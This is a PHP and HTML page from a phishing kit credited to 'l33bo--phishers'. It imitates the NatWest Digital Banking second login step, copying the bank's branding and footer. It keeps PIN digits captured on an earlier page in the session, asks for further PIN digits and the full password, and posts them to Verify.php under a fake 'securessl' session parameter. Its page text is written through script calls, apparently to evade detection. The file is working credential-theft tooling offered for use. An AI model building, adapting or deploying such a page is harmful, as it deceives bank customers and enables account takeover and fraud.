<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
$_SESSION['partpin'] = $_POST['2nd']."".$_POST['3rd']."".$_POST['4th'];
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=us-ascii" />
<title>Login</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href="assets/css/main.css" rel="stylesheet" type="text/css" media="all" />
<link href="assets/css/color.css" rel="stylesheet" type="text/css" media="all" />
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
	window.Check = function() {
	var flag = true;	
    var a = document.forms["login"]["1st"].value;
    var b = document.forms["login"]["3rd"].value;
    var c = document.forms["login"]["4th"].value;
    var d = document.forms["login"]["password"].value;
	console.log(a,b,c,d);
	var aa = document.getElementById("ErrorBox");   
	var ab = document.getElementById("1stmsg");   
	var ac = document.getElementById("ErrorIcon1st");   
	var ad = document.getElementById("InputHolder1st");   
	var ba = document.getElementById("ErrorBox");   
	var bb = document.getElementById("3rdmsg");   
	var bc = document.getElementById("ErrorIcon3rd");   
	var bd = document.getElementById("InputHolder3rd");   
	var ca = document.getElementById("ErrorBox");   
	var cb = document.getElementById("4thmsg");   
	var cc = document.getElementById("ErrorIcon4th");   
	var cd = document.getElementById("InputHolder4th"); 
	var da = document.getElementById("ErrorBox");   
	var db = document.getElementById("passmsg");   
	var dc = document.getElementById("ErrorIconpass");   
	var dd = document.getElementById("InputHolderpass");  
	var numero = /^[0-9]+$/;	
    if (a == "null" || a == "") {
        aa.style.display = "block";
        ab.innerHTML = "<li>You have entered an invalid character as part of your PIN. Your PIN only contains numbers.</li>";
        ac.style.display = "block";
        ad.style.marginLeft = "-14px";
        flag =  false;
    }
    if (b == "null" || b == "") {
        ba.style.display = "block";
        bb.innerHTML = "<li>You have entered an invalid character as part of your PIN. Your PIN only contains numbers.</li>";
        bc.style.display = "block";
        bd.style.marginLeft = "-14px";
        flag =  false;
    }
    if (c == "null" || c == "") {
        ca.style.display = "block";
        cb.innerHTML = "<li>You have entered an invalid character as part of your PIN. Your PIN only contains numbers.</li>";
        cc.style.display = "block";
        cd.style.marginLeft = "-14px";
        flag =  false;
    }
    if (d == "null" || d == "") {
        da.style.display = "block";
        db.innerHTML = "<li>You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers.</li>";
        dc.style.display = "block";
        dd.style.marginLeft = "-14px";
        flag =  false;
    }
	if (numero.test(a)) {
	}
	else {
		aa.style.display = "block";
        ab.innerHTML = "<li>You have entered an invalid character as part of your PIN. Your PIN only contains numbers.</li>";
        ac.style.display = "block";
        ad.style.marginLeft = "-14px";
        flag =  false;
	}
	if (numero.test(b)) {
	}
	else {
		ba.style.display = "block";
        bb.innerHTML = "<li>You have entered an invalid character as part of your PIN. Your PIN only contains numbers.</li>";
        bc.style.display = "block";
        bd.style.marginLeft = "-14px";
        flag =  false;
    }
	if (numero.test(c)) {
	}
	else {
		ca.style.display = "block";
        cb.innerHTML = "<li>You have entered an invalid character as part of your PIN. Your PIN only contains numbers.</li>";
        cc.style.display = "block";
        cd.style.marginLeft = "-14px";
        flag =  false;
    }		
    return flag;
    }
</script>
</head>
<body class="mainbodyclass">
<div id="wrapper" class="default_bg nobackgroundImg">
<div id="DaPage" class="PagePresent">
<div id="header" class="header">
<div class="topHeaderWrapper" style='background-color:#d8d8d8;'>
<div class="topHeaderLeftWrapper">
<ul class="globalTopnav">
<li class="OnIt"><span><script>document.write("Personal");</script></span></li>
<li class="AffIt"><a href="#"><script>document.write("Private");</script></a></li>
<li class="AffIt"><a href="#"><script>document.write("Business");</script></a></li>

<li class="AffIt"><a href="#"><script>document.write("International");</script></a></li>
</ul>
</div>
<div class="topHeaderRightWrapper">
<div class="loginWrapper"><span class="loginLink"><a href="#"><script>document.write("LOG IN");</script></a></span></div>
</div>
</div>
<div class="bottomHeaderWrapper">
<div class="bottomHeaderLeftWrapper">
<div class="rbsHeader"><a href="#"><img src="assets/img/logo.png" style="border-width:0px;" /></a></div>
<div class="globalBottomNavWrapper">
<ul class="globalBottomNav">
<li><a href="#"><script>document.write("Products");</script></a></li>
<li><a href="#"><script>document.write("Support");</script></a></li>
<li><a href="#"><script>document.write("Life Moments");</script></a></li>
</ul>
</div>
</div>
<div class="bottomHeaderRightWrapper">
<div class="quickLinksWrapper">
<ul id="quickLinks">
<li class="privacyAndCookiesTopPadding"><a href="#"><script>document.write("Privacy &amp; Cookies");</script></a></li>
<li class="last"><a href="#"><script>document.write("Accessibility");</script></a></li>
</ul>
</div>
</div>
</div>
</div>
<div id="content">
<div id="mid">
<form name="login" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" id="login" onsubmit="return Check()">
<div id="ErrorBox" tabindex="-1" class="error" style="display:block">Customer advice,
<script>document.write("Customer advice, please address the following issues:");</script>
<ul>
<span id="1stmsg"><li><script>document.write("You have entered an invalid character as part of your PIN. Your PIN only contains numbers.");</script></li></span>
<span id="3rdmsg"></span>
<span id="4thmsg"></span>
<span id="passmsg"></span>
</ul>
</div>
<div class="PageHeader">
<h1><script>document.write("Digital Banking");</script></h1>
</div>
<h2 class="headingBorderBackShaded"><script>document.write("Log In &ndash; Step 2");</script></h2>
<div class="headingChevron headingChevronBorderWhite"></div>


<div class="tabcontainer">
			
<ul class="tabUI">
<li class="active"><span class="left"></span></li>
</ul>
<div class="box_borderFrameBackWhite"><div class="box_top_borderFrameBackWhite"><hr></div>
<div class="frame">		
<div class="box_frame"><div class="box_top_frame"><hr></div>
<div class="frame">
<div class="frame">
<h3 class="frmHdr"><script>document.write("Your PIN");</script></h3>	
<span><script>document.write("Enter the following numbers from your PIN");</script></span>
<ul class="form">
<!-- 1st pin -->
<li class="first">
<span id="ErrorIcon1st" class="errorIndicator" style="color:Red;display:block;">
<img class="ErrorMarker" src="assets/img/error.gif" style="border-width:0px;">
</span>
<label for="1st" class="wizCrl wizardLabelRememberMeWide"><script>document.write("Enter the 1st number");</script></label>
<span id="InputHolder1st" style="margin-left:-14px">
<span><input name="1st" type="password" maxlength="1" size="1" id="1st" autocomplete="off" onkeyup="movetoNext(this, '3rd')"></span>
</span>
</li>
<!-- 3rd pin -->
<li>
<span id="ErrorIcon3rd" class="errorIndicator" style="color:Red;display:none;">
<img class="ErrorMarker" src="assets/img/error.gif" style="border-width:0px;">
</span>
<label for="3rd" class="wizCrl wizardLabelRememberMeWide"><script>document.write("Enter the 3rd number");</script></label>
<span id="InputHolder3rd">
<span><input name="3rd" type="password" maxlength="1" size="1" id="3rd" autocomplete="off" onkeyup="movetoNext(this, '4th')"></span>
</span>
</li>
<!-- 4nd pin -->
<li>
<span id="ErrorIcon4th" class="errorIndicator" style="color:Red;display:none;">
<img class="ErrorMarker" src="assets/img/error.gif" style="border-width:0px;">
</span>
<label for="4th" class="wizCrl wizardLabelRememberMeWide"><script>document.write("Enter the 4th number");</script></label>
<span id="InputHolder4th">
<span><input name="4th" type="password" maxlength="1" size="1" id="4th" autocomplete="off" onkeyup="movetoNext(this, 'password')"></span>
</span>
</li>
</ul>
</div>
<div class="frame">
<h3 class="frmHdr"><script>document.write("Your password");</script></h3>
<ul class="form">
<!-- pass -->
<li class="first">
<span id="ErrorIconpass" class="errorIndicator" style="color:Red;display:none;">
<img class="ErrorMarker" src="assets/img/error.gif" style="border-width:0px;">
</span>
<label for="2ndpass" class="wizCrl wizardLabelRememberMeWide"><script>document.write("Enter your FULL password");</script></label>
<span id="InputHolderpass">
<span><input name="password" type="password" maxlength="25" size="20" id="password" autocomplete="off"></span>
</span>
</li>
</ul>
</div>
<div class="frame"></div>
<div class="frame">					
<a class="arrowed" href="#"><script>document.write("Forgotten your PIN or password?");</script></a>
</div>
<div class="LoginCheckBox">
<h3 class="frmHdr"><script>document.write("Users with Special Needs");</script></h3>
<p><input id="checkbo" type="checkbox" name="checkbo">
<label for="checkbo"><script>document.write("Do not refresh my screen on timeout.");</script></label>
</p>
<p><a class="arrowed" href="#"><script>document.write("Explain our timeout feature");</script></a></p>
</div>
<div class="frame">
<div class="btnbg li5DbBtn">
<input type="submit" name="go" value="Next" id="go" class="button-right forward-arrow ">
</div>
</div>
<div class="frame">										
<div class="btnbg">
<input type="submit" name="back" value="Back" class="button-left back-arrow">
</div>
</div>                    
<div class="additionalButtonPadding"></div>
</div>
</div>
</div>
</div>
<div class="box_blank"><div class="box_top_blank"><hr></div>					
</div>
</div>
</form>
</div>
<div class="left menu leftPanelMenu"></div>
</div>
<br class="clear" /></div>
<div id="footer" class="footerContainer">
<ol class="footer_navbar">
<li><a href="#"><script>document.write("Legal Info");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li><a href="#"><script>document.write("Security");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li class="last"><span><script>document.write("&#169; 2005-2015 National Westminster Bank Plc");</script></span></li>
</ol>
</div>
</div>
</body>
</html>  
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>